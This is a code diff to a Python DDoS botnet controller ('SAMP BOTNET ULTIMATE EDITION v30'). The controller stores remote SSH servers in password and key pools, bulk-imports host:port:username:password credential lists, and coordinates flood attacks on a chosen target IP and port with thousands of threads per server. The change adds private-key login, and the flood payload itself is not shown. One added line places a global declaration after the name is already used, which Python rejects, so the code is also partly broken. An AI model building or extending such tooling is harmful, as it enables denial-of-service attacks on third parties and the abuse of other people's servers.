@@ -15,6 +15,8 @@ import random
 
 # ================= [ KONFIGURASI ] =================
 DB_FILE = "servers.json"
+DEFAULT_KEY_FILE = os.path.expanduser("~/.ssh/id_rsa")  # default private key path
+
 COLOR = {
     'red': '\033[91m',
     'green': '\033[92m',
@@ -29,11 +31,12 @@ COLOR = {
 
 # ================= [ DATABASE ] =================
 def load_servers():
-    """Load servers with safe structure"""
+    """Load servers with two separate pools: password and key"""
     if os.path.exists(DB_FILE):
         try:
             with open(DB_FILE, 'r') as f:
                 data = json.load(f)
+                # Ensure structure
                 if 'stats' not in data:
                     data['stats'] = {}
                 if 'total_attacks' not in data['stats']:
@@ -44,12 +47,23 @@ def load_servers():
                     data['stats']['total_bytes'] = 0
                 if 'total_time' not in data['stats']:
                     data['stats']['total_time'] = 0
-                if 'servers' not in data:
-                    data['servers'] = []
+                if 'servers_password' not in data:
+                    data['servers_password'] = []
+                if 'servers_key' not in data:
+                    data['servers_key'] = []
                 return data
         except:
             pass
-    return {"servers": [], "stats": {"total_attacks": 0, "total_packets": 0, "total_bytes": 0, "total_time": 0}}
+    return {
+        "servers_password": [],
+        "servers_key": [],
+        "stats": {
+            "total_attacks": 0,
+            "total_packets": 0,
+            "total_bytes": 0,
+            "total_time": 0
+        }
+    }
 
 def save_servers(data):
     """Save servers to file"""
@@ -58,25 +72,35 @@ def save_servers(data):
 
 # ================= [ SSH EXECUTION ] =================
 def execute_ssh(server, command, timeout=60):
-    """Execute command via SSH with proper error handling"""
+    """Execute command via SSH with password or key authentication"""
     try:
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         
-        ssh.connect(
-            hostname=server['host'],
-            port=server.get('port', 22),
-            username=server['username'],
-            password=server['password'],
-            timeout=10,
-            allow_agent=False,
-            look_for_keys=False
-        )
+        connect_args = {
+            'hostname': server['host'],
+            'port': server.get('port', 22),
+            'username': server['username'],
+            'timeout': 10,
+            'allow_agent': False,
+            'look_for_keys': False
+        }
         
+        # Authentication method based on server type
+        if server.get('auth_type') == 'key':
+            key_file = server.get('key_file', DEFAULT_KEY_FILE)
+            if os.path.exists(key_file):
+                pkey = paramiko.RSAKey.from_private_key_file(key_file)
+                connect_args['pkey'] = pkey
+            else:
+                raise Exception(f"Private key not found: {key_file}")
+        else:  # password
+            connect_args['password'] = server['password']
+        
+        ssh.connect(**connect_args)
         stdin, stdout, stderr = ssh.exec_command(command, timeout=timeout, get_pty=True)
         output = stdout.read().decode('utf-8', errors='ignore')
         error = stderr.read().decode('utf-8', errors='ignore')
-        
         ssh.close()
         
         if error and not output:
@@ -474,7 +498,7 @@ def print_banner():
 ╔════════════════════════════════════════════════════════════════════════════════════════════════╗
 ║                                                                                                ║
 ║                      🔥 SAMP BOTNET ULTIMATE EDITION v30 🔥                                    ║
-║                    10000+ VARIANTS - 15 VECTORS - GOD MODE                                     ║
+║               PASSWORD + SSH KEY DUAL MANAGEMENT - GOD MODE                                    ║
 ║                                                                                                ║
 ╚════════════════════════════════════════════════════════════════════════════════════════════════╝
 {COLOR['reset']}
@@ -486,41 +510,53 @@ def menu_manage_servers(data):
         clear_screen()
         print_banner()
         
-        print(f"{COLOR['cyan']}📌 SERVER MANAGEMENT{COLOR['reset']}")
-        print("1️⃣  List Servers")
-        print("2️⃣  Add Server")
-        print("3️⃣  Bulk Add Servers (from file)")
-        print("4️⃣  Remove Server")
-        print("5️⃣  Test Server")
-        print("6️⃣  Test All Servers")
-        print("7️⃣  Back")
+        print(f"{COLOR['cyan']}📌 SERVER MANAGEMENT - DUAL MODE{COLOR['reset']}")
+        print(f"{COLOR['green']}1️⃣  Manage Password Servers (🔒){COLOR['reset']}")
+        print(f"{COLOR['blue']}2️⃣  Manage SSH Key Servers (🔑){COLOR['reset']}")
+        print("3️⃣  Back to Main Menu")
         
         choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
         
         if choice == '1':
-            print(f"\n{COLOR['bold']}SERVER LIST:{COLOR['reset']}")
-            if not data['servers']:
-                print("Belum ada server")
-            else:
-                total_bw = 0
-                total_cores = 0
-                for i, s in enumerate(data['servers'], 1):
-                    status = "✅" if s.get('active', False) else "⏳"
-                    cpu = s.get('cpu_cores', '?')
-                    bw = s.get('bandwidth', '?')
-                    latency = s.get('latency', '?')
-                    print(f"{status} {i}. {s['host']} - {s['username']} | CPU: {cpu} cores | BW: {bw}Mbps | Lat: {latency}ms")
-                    
-                    if s.get('active', False):
-                        total_bw += s.get('bandwidth', 0)
-                        total_cores += s.get('cpu_cores', 0)
-                
-                active = len([s for s in data['servers'] if s.get('active', False)])
-                print(f"\n📊 Total Active: {active} servers | {total_cores} cores | {total_bw:.0f} Mbps")
-            input("\nEnter untuk kembali...")
-            
+            menu_password_servers(data)
         elif choice == '2':
-            print(f"\n{COLOR['yellow']}Tambah Server Baru:{COLOR['reset']}")
+            menu_key_servers(data)
+        elif choice == '3':
+            break
+
+def menu_password_servers(data):
+    """Manage servers that use password authentication"""
+    while True:
+        clear_screen()
+        print_banner()
+        print(f"{COLOR['green']}🔒 PASSWORD SERVERS MANAGEMENT{COLOR['reset']}\n")
+        
+        # Display password servers
+        pwd_servers = data.get('servers_password', [])
+        if not pwd_servers:
+            print("No password servers configured.\n")
+        else:
+            total_bw = sum([s.get('bandwidth', 0) for s in pwd_servers if s.get('active')])
+            total_cores = sum([s.get('cpu_cores', 0) for s in pwd_servers if s.get('active')])
+            print(f"{COLOR['bold']}Active: {len([s for s in pwd_servers if s.get('active')])} | Total BW: {total_bw:.0f} Mbps | Total Cores: {total_cores}{COLOR['reset']}\n")
+            for i, s in enumerate(pwd_servers, 1):
+                status = "✅" if s.get('active', False) else "⏳"
+                cpu = s.get('cpu_cores', '?')
+                bw = s.get('bandwidth', '?')
+                lat = s.get('latency', '?')
+                print(f"{status} {i}. {s['host']} - {s['username']} | CPU: {cpu} cores | BW: {bw}Mbps | Lat: {lat}ms")
+        
+        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
+        print("1️⃣  Add Password Server")
+        print("2️⃣  Bulk Add Password Servers (from file)")
+        print("3️⃣  Remove Password Server")
+        print("4️⃣  Test Password Server")
+        print("5️⃣  Test All Password Servers")
+        print("6️⃣  Back")
+        
+        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
+        
+        if choice == '1':
             host = input("Host/IP: ")
             username = input("Username: ")
             password = input("Password: ")
@@ -531,6 +567,7 @@ def menu_manage_servers(data):
                 'username': username,
                 'password': password,
                 'port': int(port),
+                'auth_type': 'password',
                 'added': time.time(),
                 'active': False,
                 'cpu_cores': 0,
@@ -538,21 +575,17 @@ def menu_manage_servers(data):
                 'bandwidth': 100,
                 'latency': 999
             }
-            
-            data['servers'].append(server)
+            data['servers_password'].append(server)
             save_servers(data)
-            print(f"{COLOR['green']}✅ Server added{COLOR['reset']}")
+            print(f"{COLOR['green']}✅ Password server added{COLOR['reset']}")
             time.sleep(1)
             
-        elif choice == '3':
-            print(f"\n{COLOR['yellow']}Bulk Add Servers:{COLOR['reset']}")
+        elif choice == '2':
             print("Format file: host:port:username:password per line")
             file_path = input("Path ke file: ")
-            
             try:
                 with open(file_path, 'r') as f:
                     lines = f.readlines()
-                
                 count = 0
                 for line in lines:
                     line = line.strip()
@@ -562,13 +595,13 @@ def menu_manage_servers(data):
                             host = parts[0]
                             port = int(parts[1])
                             username = parts[2]
-                            password = ':'.join(parts[3:])  # Handle password with colons
-                            
+                            password = ':'.join(parts[3:])
                             server = {
                                 'host': host,
                                 'username': username,
                                 'password': password,
                                 'port': port,
+                                'auth_type': 'password',
                                 'added': time.time(),
                                 'active': False,
                                 'cpu_cores': 0,
@@ -576,115 +609,303 @@ def menu_manage_servers(data):
                                 'bandwidth': 100,
                                 'latency': 999
                             }
-                            data['servers'].append(server)
+                            data['servers_password'].append(server)
                             count += 1
-                
                 save_servers(data)
-                print(f"{COLOR['green']}✅ {count} servers added{COLOR['reset']}")
+                print(f"{COLOR['green']}✅ {count} password servers added{COLOR['reset']}")
             except Exception as e:
                 print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
             time.sleep(2)
             
-        elif choice == '4':
-            if not data['servers']:
-                print("Belum ada server")
+        elif choice == '3':
+            if not data['servers_password']:
+                print("No password servers to remove")
                 time.sleep(1)
                 continue
-            
-            print(f"\n{COLOR['bold']}Pilih server yang dihapus:{COLOR['reset']}")
-            for i, s in enumerate(data['servers'], 1):
-                status = "✅" if s.get('active', False) else "⏳"
-                print(f"{i}. {status} {s['host']}")
-            
+            print("\nSelect server to remove:")
+            for i, s in enumerate(data['servers_password'], 1):
+                print(f"{i}. {s['host']}")
             try:
-                idx = int(input("Nomor: ")) - 1
-                if 0 <= idx < len(data['servers']):
-                    removed = data['servers'].pop(idx)
+                idx = int(input("Number: ")) - 1
+                if 0 <= idx < len(data['servers_password']):
+                    removed = data['servers_password'].pop(idx)
                     save_servers(data)
                     print(f"{COLOR['green']}✅ {removed['host']} removed{COLOR['reset']}")
                 else:
-                    print("Nomor tidak valid")
+                    print("Invalid number")
             except:
-                print("Input tidak valid")
+                print("Invalid input")
             time.sleep(1)
             
-        elif choice == '5':
-            if not data['servers']:
-                print("Belum ada server")
+        elif choice == '4':
+            if not data['servers_password']:
+                print("No password servers to test")
                 time.sleep(1)
                 continue
-            
-            print(f"\n{COLOR['bold']}Pilih server untuk test:{COLOR['reset']}")
-            for i, s in enumerate(data['servers'], 1):
+            print("\nSelect server to test:")
+            for i, s in enumerate(data['servers_password'], 1):
                 print(f"{i}. {s['host']}")
-            
             try:
-                idx = int(input("Nomor: ")) - 1
-                if 0 <= idx < len(data['servers']):
-                    server = data['servers'][idx]
+                idx = int(input("Number: ")) - 1
+                if 0 <= idx < len(data['servers_password']):
+                    server = data['servers_password'][idx]
                     if test_server(server):
                         server['active'] = True
                     else:
                         server['active'] = False
                     save_servers(data)
                 else:
-                    print("Nomor tidak valid")
+                    print("Invalid number")
             except:
-                print("Input tidak valid")
-            input("\nEnter untuk kembali...")
+                print("Invalid input")
+            input("\nEnter to continue...")
             
-        elif choice == '6':
-            if not data['servers']:
-                print("Belum ada server")
+        elif choice == '5':
+            if not data['servers_password']:
+                print("No password servers to test")
                 time.sleep(1)
                 continue
-            
-            print(f"\n{COLOR['yellow']}Testing all servers...{COLOR['reset']}")
-            
+            print(f"\n{COLOR['yellow']}Testing all password servers...{COLOR['reset']}")
             def test_single(server, idx):
-                print(f"\n[{idx+1}/{len(data['servers'])}] Testing {server['host']}...")
+                print(f"\n[{idx+1}/{len(data['servers_password'])}] Testing {server['host']}...")
                 if test_server(server):
                     server['active'] = True
                 else:
                     server['active'] = False
-            
             threads = []
-            for i, server in enumerate(data['servers']):
+            for i, server in enumerate(data['servers_password']):
                 t = threading.Thread(target=test_single, args=(server, i))
                 t.start()
                 threads.append(t)
                 time.sleep(0.5)
-            
             for t in threads:
                 t.join()
-            
             save_servers(data)
+            active = len([s for s in data['servers_password'] if s.get('active')])
+            print(f"\n{COLOR['green']}✅ Test complete. Active: {active}/{len(data['servers_password'])}{COLOR['reset']}")
+            input("\nEnter to continue...")
             
-            active = len([s for s in data['servers'] if s.get('active', False)])
-            print(f"\n{COLOR['green']}✅ Test complete. Active: {active}/{len(data['servers'])}{COLOR['reset']}")
-            input("\nEnter untuk kembali...")
+        elif choice == '6':
+            break
+
+def menu_key_servers(data):
+    """Manage servers that use SSH key authentication"""
+    while True:
+        clear_screen()
+        print_banner()
+        print(f"{COLOR['blue']}🔑 SSH KEY SERVERS MANAGEMENT{COLOR['reset']}\n")
+        
+        # Display key servers
+        key_servers = data.get('servers_key', [])
+        if not key_servers:
+            print("No SSH key servers configured.\n")
+        else:
+            total_bw = sum([s.get('bandwidth', 0) for s in key_servers if s.get('active')])
+            total_cores = sum([s.get('cpu_cores', 0) for s in key_servers if s.get('active')])
+            print(f"{COLOR['bold']}Active: {len([s for s in key_servers if s.get('active')])} | Total BW: {total_bw:.0f} Mbps | Total Cores: {total_cores}{COLOR['reset']}\n")
+            for i, s in enumerate(key_servers, 1):
+                status = "✅" if s.get('active', False) else "⏳"
+                cpu = s.get('cpu_cores', '?')
+                bw = s.get('bandwidth', '?')
+                lat = s.get('latency', '?')
+                key_file = s.get('key_file', DEFAULT_KEY_FILE)
+                print(f"{status} {i}. {s['host']} - {s['username']} | CPU: {cpu} cores | BW: {bw}Mbps | Lat: {lat}ms | Key: {os.path.basename(key_file)}")
+        
+        print(f"\n{COLOR['cyan']}Options:{COLOR['reset']}")
+        print("1️⃣  Add SSH Key Server")
+        print("2️⃣  Bulk Add SSH Key Servers (from file)")
+        print("3️⃣  Remove SSH Key Server")
+        print("4️⃣  Test SSH Key Server")
+        print("5️⃣  Test All SSH Key Servers")
+        print("6️⃣  Set Global Private Key Path")
+        print("7️⃣  Back")
+        
+        choice = input(f"\n{COLOR['yellow']}Pilih: {COLOR['reset']}")
+        
+        if choice == '1':
+            host = input("Host/IP: ")
+            username = input("Username: ")
+            key_file = input(f"Path to private key [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
+            port = input("Port SSH (22): ") or "22"
+            
+            server = {
+                'host': host,
+                'username': username,
+                'key_file': key_file,
+                'port': int(port),
+                'auth_type': 'key',
+                'added': time.time(),
+                'active': False,
+                'cpu_cores': 0,
+                'ram_mb': 0,
+                'bandwidth': 100,
+                'latency': 999
+            }
+            data['servers_key'].append(server)
+            save_servers(data)
+            print(f"{COLOR['green']}✅ SSH key server added{COLOR['reset']}")
+            time.sleep(1)
+            
+        elif choice == '2':
+            print("Format file: host:port:username:key_file_path")
+            file_path = input("Path ke file: ")
+            try:
+                with open(file_path, 'r') as f:
+                    lines = f.readlines()
+                count = 0
+                for line in lines:
+                    line = line.strip()
+                    if line and not line.startswith('#'):
+                        parts = line.split(':')
+                        if len(parts) >= 4:
+                            host = parts[0]
+                            port = int(parts[1])
+                            username = parts[2]
+                            key_file = ':'.join(parts[3:])
+                            server = {
+                                'host': host,
+                                'username': username,
+                                'key_file': key_file,
+                                'port': port,
+                                'auth_type': 'key',
+                                'added': time.time(),
+                                'active': False,
+                                'cpu_cores': 0,
+                                'ram_mb': 0,
+                                'bandwidth': 100,
+                                'latency': 999
+                            }
+                            data['servers_key'].append(server)
+                            count += 1
+                save_servers(data)
+                print(f"{COLOR['green']}✅ {count} SSH key servers added{COLOR['reset']}")
+            except Exception as e:
+                print(f"{COLOR['red']}❌ Error: {e}{COLOR['reset']}")
+            time.sleep(2)
+            
+        elif choice == '3':
+            if not data['servers_key']:
+                print("No SSH key servers to remove")
+                time.sleep(1)
+                continue
+            print("\nSelect server to remove:")
+            for i, s in enumerate(data['servers_key'], 1):
+                print(f"{i}. {s['host']}")
+            try:
+                idx = int(input("Number: ")) - 1
+                if 0 <= idx < len(data['servers_key']):
+                    removed = data['servers_key'].pop(idx)
+                    save_servers(data)
+                    print(f"{COLOR['green']}✅ {removed['host']} removed{COLOR['reset']}")
+                else:
+                    print("Invalid number")
+            except:
+                print("Invalid input")
+            time.sleep(1)
+            
+        elif choice == '4':
+            if not data['servers_key']:
+                print("No SSH key servers to test")
+                time.sleep(1)
+                continue
+            print("\nSelect server to test:")
+            for i, s in enumerate(data['servers_key'], 1):
+                print(f"{i}. {s['host']}")
+            try:
+                idx = int(input("Number: ")) - 1
+                if 0 <= idx < len(data['servers_key']):
+                    server = data['servers_key'][idx]
+                    if test_server(server):
+                        server['active'] = True
+                    else:
+                        server['active'] = False
+                    save_servers(data)
+                else:
+                    print("Invalid number")
+            except:
+                print("Invalid input")
+            input("\nEnter to continue...")
+            
+        elif choice == '5':
+            if not data['servers_key']:
+                print("No SSH key servers to test")
+                time.sleep(1)
+                continue
+            print(f"\n{COLOR['yellow']}Testing all SSH key servers...{COLOR['reset']}")
+            def test_single(server, idx):
+                print(f"\n[{idx+1}/{len(data['servers_key'])}] Testing {server['host']}...")
+                if test_server(server):
+                    server['active'] = True
+                else:
+                    server['active'] = False
+            threads = []
+            for i, server in enumerate(data['servers_key']):
+                t = threading.Thread(target=test_single, args=(server, i))
+                t.start()
+                threads.append(t)
+                time.sleep(0.5)
+            for t in threads:
+                t.join()
+            save_servers(data)
+            active = len([s for s in data['servers_key'] if s.get('active')])
+            print(f"\n{COLOR['green']}✅ Test complete. Active: {active}/{len(data['servers_key'])}{COLOR['reset']}")
+            input("\nEnter to continue...")
+            
+        elif choice == '6':
+            new_key = input(f"Enter new default private key path [{DEFAULT_KEY_FILE}]: ") or DEFAULT_KEY_FILE
+            global DEFAULT_KEY_FILE
+            DEFAULT_KEY_FILE = new_key
+            print(f"{COLOR['green']}✅ Global private key path set to {DEFAULT_KEY_FILE}{COLOR['reset']}")
+            time.sleep(1)
             
         elif choice == '7':
             break
 
 def menu_launch_attack(data):
-    active_servers = [s for s in data['servers'] if s.get('active', False)]
+    """Launch attack with selectable server pool"""
+    # Collect all active servers from both pools
+    pwd_active = [s for s in data.get('servers_password', []) if s.get('active', False)]
+    key_active = [s for s in data.get('servers_key', []) if s.get('active', False)]
     
-    if not active_servers:
-        print(f"{COLOR['red']}❌ Tidak ada server aktif! Test server dulu.{COLOR['reset']}")
-        input("\nEnter untuk kembali...")
+    if not pwd_active and not key_active:
+        print(f"{COLOR['red']}❌ No active servers! Please test servers first.{COLOR['reset']}")
+        input("\nEnter to continue...")
         return
     
     clear_screen()
     print_banner()
     
     print(f"{COLOR['cyan']}🎯 LAUNCH ATTACK{COLOR['reset']}")
-    print(f"Server aktif: {len(active_servers)}")
+    print(f"🔒 Active Password Servers: {len(pwd_active)}")
+    print(f"🔑 Active SSH Key Servers: {len(key_active)}")
+    print(f"📊 Total Active Servers: {len(pwd_active) + len(key_active)}")
     
-    total_cores = sum([s.get('cpu_cores', 2) for s in active_servers])
-    total_ram = sum([s.get('ram_mb', 2048) for s in active_servers]) / 1024
-    total_bw = sum([s.get('bandwidth', 100) for s in active_servers])
+    # Choose which servers to use
+    print(f"\n{COLOR['bold']}Select server pool:{COLOR['reset']}")
+    print("1️⃣  Use only Password Servers")
+    print("2️⃣  Use only SSH Key Servers")
+    print("3️⃣  Use ALL Servers (Password + Key)")
     
+    pool_choice = input(f"{COLOR['yellow']}Choice (1-3): {COLOR['reset']}")
+    if pool_choice == '1':
+        servers = pwd_active
+    elif pool_choice == '2':
+        servers = key_active
+    else:
+        servers = pwd_active + key_active
+    
+    if not servers:
+        print(f"{COLOR['red']}❌ No servers in selected pool!{COLOR['reset']}")
+        input("\nEnter to continue...")
+        return
+    
+    # Show pool stats
+    total_cores = sum([s.get('cpu_cores', 2) for s in servers])
+    total_ram = sum([s.get('ram_mb', 2048) for s in servers]) / 1024
+    total_bw = sum([s.get('bandwidth', 100) for s in servers])
+    
+    print(f"\n{COLOR['cyan']}Selected pool:{COLOR['reset']}")
+    print(f"Total Servers: {len(servers)}")
     print(f"Total CPU Cores: {total_cores}")
     print(f"Total RAM: {total_ram:.1f} GB")
     print(f"Total Bandwidth: {total_bw:.0f} Mbps ({total_bw/1000:.1f} Gbps)\n")
@@ -712,7 +933,7 @@ def menu_launch_attack(data):
         method = methods.get(method_choice, 'GOD')
         
         # Auto-calculate optimal threads
-        avg_cpu = total_cores / len(active_servers)
+        avg_cpu = total_cores / len(servers)
         suggested = int(avg_cpu * 500)  # 500 threads per core
         suggested = max(500, min(2500, suggested))
         
@@ -724,7 +945,7 @@ def menu_launch_attack(data):
             print(f"{COLOR['yellow']}⚠️ Threads dibatasi 2500{COLOR['reset']}")
         
         # Estimasi kekuatan
-        est_pps = threads * 200 * len(active_servers)  # 200 PPS per thread
+        est_pps = threads * 200 * len(servers)  # 200 PPS per thread
         est_mbps = (est_pps * 512 * 8) / 1e6  # 512 bytes average
         est_gbps = est_mbps / 1000
         
@@ -732,15 +953,15 @@ def menu_launch_attack(data):
         print(f"Target: {target_ip}:{target_port}")
         print(f"Duration: {duration}s")
         print(f"Method: {method}")
-        print(f"Servers: {len(active_servers)}")
+        print(f"Servers: {len(servers)}")
         print(f"Threads/server: {threads}")
-        print(f"Total Threads: {len(active_servers) * threads}")
+        print(f"Total Threads: {len(servers) * threads}")
         print(f"Estimated PPS: {format_number(est_pps)}")
         print(f"Estimated Bandwidth: {est_gbps:.1f} Gbps")
         
         confirm = input(f"\n{COLOR['red']}Mulai attack? (y/n): {COLOR['reset']}")
         if confirm.lower() == 'y':
-            deploy_attack(active_servers, target_ip, target_port, duration, method, threads)
+            deploy_attack(servers, target_ip, target_port, duration, method, threads)
         else:
             print("Dibatalkan")
             
@@ -753,12 +974,17 @@ def menu_stats(data):
     clear_screen()
     print_banner()
     
-    total = len(data['servers'])
-    active = len([s for s in data['servers'] if s.get('active', False)])
+    pwd_total = len(data.get('servers_password', []))
+    pwd_active = len([s for s in data.get('servers_password', []) if s.get('active', False)])
+    key_total = len(data.get('servers_key', []))
+    key_active = len([s for s in data.get('servers_key', []) if s.get('active', False)])
     
-    total_cores = sum([s.get('cpu_cores', 0) for s in data['servers']])
-    total_ram = sum([s.get('ram_mb', 0) for s in data['servers']]) / 1024
-    total_bw = sum([s.get('bandwidth', 0) for s in data['servers']])
+    total_servers = pwd_total + key_total
+    total_active = pwd_active + key_active
+    
+    total_cores = sum([s.get('cpu_cores', 0) for s in data.get('servers_password', [])] + [s.get('cpu_cores', 0) for s in data.get('servers_key', [])])
+    total_ram = (sum([s.get('ram_mb', 0) for s in data.get('servers_password', [])] + [s.get('ram_mb', 0) for s in data.get('servers_key', [])])) / 1024
+    total_bw = sum([s.get('bandwidth', 0) for s in data.get('servers_password', []) if s.get('active')] + [s.get('bandwidth', 0) for s in data.get('servers_key', []) if s.get('active')])
     
     attacks = data['stats'].get('total_attacks', 0)
     packets = data['stats'].get('total_packets', 0)
@@ -766,12 +992,11 @@ def menu_stats(data):
     total_time = data['stats'].get('total_time', 0)
     
     print(f"{COLOR['cyan']}📊 GLOBAL STATISTICS{COLOR['reset']}")
-    print(f"Total servers: {total}")
-    print(f"Active: {active} ✅")
-    print(f"Pending: {total - active} ⏳")
+    print(f"Total servers: {total_servers} (🔒 Password: {pwd_total}, 🔑 Key: {key_total})")
+    print(f"Active: {total_active} ✅ (🔒: {pwd_active}, 🔑: {key_active})")
     print(f"Total CPU Cores: {total_cores}")
     print(f"Total RAM: {total_ram:.1f} GB")
-    print(f"Total Bandwidth: {total_bw:.0f} Mbps ({total_bw/1000:.1f} Gbps)")
+    print(f"Total Bandwidth (active): {total_bw:.0f} Mbps ({total_bw/1000:.1f} Gbps)")
     print(f"\nTotal attacks: {attacks}")
     print(f"Total packets: {format_number(packets)}")
     print(f"Total data: {format_number(bytes_total)} bytes ({bytes_total/1024/1024/1024:.2f} GB)")
@@ -782,23 +1007,25 @@ def menu_stats(data):
         print(f"Average data/attack: {format_number(bytes_total // attacks)} bytes")
         print(f"Average duration: {total_time/attacks:.1f} seconds")
     
-    if data['servers']:
-        print(f"\n{COLOR['bold']}Server Details:{COLOR['reset']}")
-        # Sort by bandwidth (highest first)
-        sorted_servers = sorted(data['servers'], key=lambda x: x.get('bandwidth', 0), reverse=True)
-        for s in sorted_servers:
-            status = "✅" if s.get('active', False) else "⏳"
-            added = datetime.fromtimestamp(s.get('added', 0)).strftime('%Y-%m-%d')
-            cpu = s.get('cpu_cores', '?')
-            bw = s.get('bandwidth', '?')
-            lat = s.get('latency', '?')
-            print(f"{status} {s['host']} - CPU: {cpu}c | BW: {bw}Mbps | Lat: {lat}ms | Added: {added}")
+    print(f"\n{COLOR['bold']}Server Details (Active):{COLOR['reset']}")
+    # Combine both lists and sort by bandwidth
+    all_servers = data.get('servers_password', []) + data.get('servers_key', [])
+    all_servers = [s for s in all_servers if s.get('active')]
+    all_servers.sort(key=lambda x: x.get('bandwidth', 0), reverse=True)
+    for s in all_servers:
+        added = datetime.fromtimestamp(s.get('added', 0)).strftime('%Y-%m-%d')
+        cpu = s.get('cpu_cores', '?')
+        bw = s.get('bandwidth', '?')
+        lat = s.get('latency', '?')
+        auth_type = "🔒" if s.get('auth_type') == 'password' else "🔑"
+        print(f"{auth_type} {s['host']} - CPU: {cpu}c | BW: {bw}Mbps | Lat: {lat}ms | Added: {added}")
     
     input("\nEnter untuk kembali...")
 
 def menu_batch_attack(data):
     """Batch attack from file"""
-    active_servers = [s for s in data['servers'] if s.get('active', False)]
+    # Collect active servers
+    active_servers = [s for s in data.get('servers_password', []) if s.get('active')] + [s for s in data.get('servers_key', []) if s.get('active')]
     
     if not active_servers:
         print(f"{COLOR['red']}❌ Tidak ada server aktif!{COLOR['reset']}")
@@ -888,14 +1115,19 @@ def main():
         clear_screen()
         print_banner()
         
-        total = len(data['servers'])
-        active = len([s for s in data['servers'] if s.get('active', False)])
+        pwd_total = len(data.get('servers_password', []))
+        pwd_active = len([s for s in data.get('servers_password', []) if s.get('active', False)])
+        key_total = len(data.get('servers_key', []))
+        key_active = len([s for s in data.get('servers_key', []) if s.get('active', False)])
+        total_servers = pwd_total + key_total
+        total_active = pwd_active + key_active
+        
+        total_bw = sum([s.get('bandwidth', 0) for s in data.get('servers_password', []) if s.get('active')] + [s.get('bandwidth', 0) for s in data.get('servers_key', []) if s.get('active')])
         attacks = data['stats'].get('total_attacks', 0)
         packets = data['stats'].get('total_packets', 0)
-        total_bw = sum([s.get('bandwidth', 0) for s in data['servers'] if s.get('active', False)])
         
         print(f"{COLOR['cyan']}📊 SYSTEM STATUS{COLOR['reset']}")
-        print(f"├─ Servers: {active}/{total} active")
+        print(f"├─ Total Servers: {total_active}/{total_servers} active (🔒: {pwd_active} | 🔑: {key_active})")
         print(f"├─ Total Power: {total_bw/1000:.1f} Gbps available")
         print(f"├─ Total Attacks: {attacks}")
         print(f"└─ Total Packets: {format_number(packets)}\n")
